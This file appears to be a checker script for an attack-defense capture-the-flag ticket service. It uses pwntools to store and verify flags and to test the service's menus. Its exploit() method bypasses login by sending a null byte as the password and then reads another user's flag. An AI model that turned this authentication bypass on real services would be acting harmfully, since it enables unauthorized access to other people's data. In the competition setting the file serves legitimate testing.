#!/usr/bin/env python3
#socat TCP-LISTEN:7478,nodelay,reuseaddr,fork EXEC:"stdbuf -i0 -o0 -e0 ./a.out"

from pwn import * 
import sys
import time
from enochecker import *
import string
from random import randrange


#BrokenServiceException = broken but its reachable 
#OfflineException = obvious

class FlugChecker(BaseChecker):

    flag_count = 1
    noise_count = 1
    havoc_count = 1
    global port 
    port = 7478


    def putflag(self):  # type: () -> None
        username = self.gen_user()
        password = self.gen_password()

        try:
            print('Connecting ...')
            p = remote(self.address,port)
            print("Connection succeded")
        except:
            raise OfflineException("Unable to connect to the service [putflag]")

        print("Reistering a user with username: {} and password {} [putflag]".format(username,password))


        try:    
            p.recvuntil(b"================")
            p.sendlineafter(b"================",b"2")
            p.sendlineafter(b"Please input your new username:",bytes(username,'utf-8'))
            p.sendlineafter(b"Please input your password:\n",bytes(password,'utf-8'))
        except:
            raise BrokenServiceException("Registration failed [putflag]")


        try:
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n",b"1")
            p.sendlineafter(b"Please input your username:\n",bytes(username,'utf-8'))
            p.sendlineafter(b"Please input your password:\n",bytes(password,'utf-8'))
        except:
            raise BrokenServiceException("Login failed [putflag]")


        try:
            p.recvuntil(b"================\n")   
            p.sendlineafter(b"================\n",b"1")
            time.sleep(.1)
            p.recvuntil(b"Enter the content of your new ticket\n")
            print("Putting in flag: {}".format(self.flag))
            p.sendline(bytes(self.flag,'utf-8'))
            time.sleep(.1)

        except:
            raise BrokenServiceException("Put flag failed [putflag]")


        try:
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n",b"2")
            stdo = p.recvline()
            ticket_id = p.recvline().decode('utf-8').split(" ")[1]
            print("The new flag is at index: {}".format(ticket_id))
            self.team_db[self.flag] = (username,password,ticket_id)
        except:
            raise BrokenServiceException("There were problems with database or view tickets doesnt work [putflag]")


    def getflag(self):  # type: () -> None
        try:
            print('Connecting ...')
            p = remote(self.address,port)
            print("Connection succeded")
        except:
            raise OfflineException("Connection failed [getflag]")


        try:
            print('Retrieveng Flag ...')
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n","3")
            p.sendlineafter(b"Enter the unique id of your ticket",bytes(self.team_db[self.flag][2],'utf-8'))
            p.recvline()
            p.recvline()
            flag2 = p.recvline().decode('utf-8')
        except:
            raise BrokenServiceException("Unable to get flag from the service [getflag]")
        print('flag retireved: {}'.format(flag2))
        print('flag should be: {}'.format(self.flag))
        if flag2.strip() != self.flag.strip():
            raise BrokenServiceException("The flags dont mach! [getflag]")


    def putnoise(self):  # type: () -> None

        username = self.gen_user()
        password = self.gen_password()


        try:
            print('Connecting ...')
            p = remote(self.address,port)
            print("Connection succeded")
        except:
            raise enochecker("Connection failed at put noise")


        print('Puting in noise with username: {} and password: {}'.format(username,password))
        try:
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n",b"2")
            p.sendlineafter(b"Please input your new username:\n",bytes(username,'utf-8'))
            p.sendlineafter(b"Please input your password:\n",bytes(password,'utf-8'))
        except: 
            raise BrokenServiceException("Registration failed [putnoise]")


        try:
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n",b"1")
            p.sendlineafter(b"Please input your username:\n",bytes(username,'utf-8'))
            p.sendlineafter(b"Please input your password:\n",bytes(password,'utf-8'))
        except:
            raise BrokenServiceException("Login failed [putnoise]")


        try:
            p.recvuntil(b"================\n")   
            p.sendlineafter(b"================\n",b"1")
            time.sleep(.1)
            p.recvuntil(b"Enter the content of your new ticket\n")
            p.sendline(bytes(self.noise,'utf-8'))
            print('puting in noise: {}'.format(self.noise))    
        except:
            raise BrokenServiceException("Putting in noise failed [putnoise]")


        try:
            time.sleep(.1)
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n",b"2")
            stdo = p.recvline()
            noise_id = p.recvline().decode('utf-8').split(' ')[1]
            print('Noise is set at id: {}'.format(noise_id))
            self.team_db[self.noise] = (username,password,noise_id)
        except:
            raise BrokenServiceException("There were problems with database or view tickets [putnoise]")


        self.team_db["noise"] = self.noise
    def getnoise(self):  # type: () -> None

        try:
            print('Connecting ...')
            p = remote(self.address,port)
            print("Connection succeded")
        except:
             raise OfflineException("Connection failed [getnoise]")


        try:
            print("Getting noise ...")
            p.recvuntil(b"================\n")
            p.sendlineafter(b"================\n",b"3")
            p.sendlineafter(b"Enter the unique id of your ticket",bytes(self.team_db[self.noise][2],'utf-8'))
            p.recvline()
            p.recvline()
            noise2 = p.recvline().decode('utf-8') 
            print('Got noise: {}'.format(noise2))
            print('Expected noise: {}'.format(self.noise))                 
            if noise2.strip() != self.noise.strip():
                raise BrokenServiceException("Noises dont match [getnoise]")
        except:
            BrokenServiceException('fail at [getnoise]')
        """
        This method retrieves noise in the service.
        The noise to be retrieved is inside self.flag
        The difference between noise and flag is, tht noise does not have to remain secret for other teams.
        This method can be called many times per round. Check how often using flag_idx.
        On error, raise an EnoException.
        :raises EnoException on error
        :return this function can return a result if it wants
                if nothing is returned, the service status is considered okay.
                the preferred way to report errors in the service is by raising an appropriate enoexception
        """
    def havoc(self):  # type: () -> None
        try:
            self.putnoise()
            self.getnoise()
        except:
            raise BrokenServiceException("Get noise or putnoise failed [havoc]")
        try:
            p = remote(self.address,port)
        except:
            raise OfflineException('service is unreachable [havoc]')
        pass_test = True


        #we create a new ticket with current noise 
        test_ticket = self.team_db[self.noise][2]
        test_value = self.noise 

        # we login using current noise user
        test_user = self.team_db[self.noise][0]
        test_pass = self.team_db[self.noise][1]

        #we check for words in these arrs when checking the menu
        must_be_in_menu1 = ['menu','login','register','view ticket','exit']
        must_be_in_view_ticket_menu = ['ticket','id']
        must_be_in_menu_when_logged_in = ['buy ticket','view my tickets','view ticket','logout']

        #Check first menu
        menu1 = p.recv(200).decode('utf-8').lower()
        for elem in must_be_in_menu1:
            if elem not in menu1:
                print('failed first test: \'{}\' not in menu'.format(elem))
                raise BrokenServiceException('Menu1 isnt ok [havoc]')

        sleep(.2)
        p.sendline(b'3')
        menu_after_view_ticket_global = p.recv(200).decode('utf-8').lower()

        #Check the view ticket message
        for elem in must_be_in_view_ticket_menu:
            if elem not in menu_after_view_ticket_global:
                print('failed second test: \'{}\' not in menu'.format(elem))
                raise BrokenServiceException('View Ticket menu is not ok [havoc]')
        sleep(.2)

        p.sendline(test_ticket)

        p.sendlineafter(b"================\n",b'1')
        p.sendlineafter(b'Please input your username:\n',bytes(test_user,'utf-8'))
        p.sendlineafter(b'Please input your password:\n',bytes(test_pass,'utf-8'))
        logged_in_menu =p.recv(130).decode('utf-8').lower()
        logged_in_menu +=p.recv(130).decode('utf-8').lower()
        print('+++++++++++\nmenu: {}\n+++++++++++++'.format(logged_in_menu))
        sleep(.3)

        #Check the menu when logged in
        for elem in must_be_in_menu_when_logged_in:
            if elem not in logged_in_menu:
                print('failed last test: \'{}\' not in menu'.format(elem))
                raise BrokenServiceException('menu when logged isnt ok [havoc]')

        """
        This method unleashes havoc on the app -> Do whatever you must to prove the service still works. Or not.
        On error, raise an EnoException.
        :raises EnoException on Error
        :return This function can return a result if it wants
                If nothing is returned, the service status is considered okay.
                The preferred way to report Errors in the service is by raising an appropriate EnoException
        """

    def exploit(self):
        #1st vuln
        p = remote(self.address,port)
        username = self.team_db[self.flag][0]

        p.recvuntil(b"================\n")
        p.sendlineafter(b"================\n",b'1')
        p.sendlineafter(b"Please input your username:\n",bytes(username,'utf-8'))
        p.sendlineafter(b"Please input your password:\n",'\x00')
        #p.recvline() #TODO: odstrani ko urban popravi svoje randomly placed printfe
        p.recv(2)
        check_line = p.recvline().decode('utf-8').strip()
        p.recvuntil(b"================\n")
        p.sendlineafter(b"================\n",b"2")
        stdo = p.recvline()
        flag_id = p.recvline().decode('utf-8').split(' ')[1]
        p.recvuntil(b"================\n")
        p.sendlineafter(b"================\n",b"3")
        p.sendlineafter(b"Enter the unique id of your ticket",bytes(flag_id,'utf-8'))
        p.recvline()
        p.recvline()
        flag = p.recvline().decode('utf-8').split()


        if username in check_line:
            print(flag)
        else:
            print("Sad nox")
        pass

    def gen_user(self): 
        source = list(string.ascii_lowercase)
        username =''
        for num in range(25):
            rand_int = randrange(25)
            username += source[rand_int]
        return username

    def gen_password(self): 
        source = list(string.ascii_lowercase)
        password =''
        for num in range(25):
            rand_int = randrange(25)
            password += source[rand_int]
        return password




app = FlugChecker.service

if __name__ == "__main__":
        run(FlugChecker)
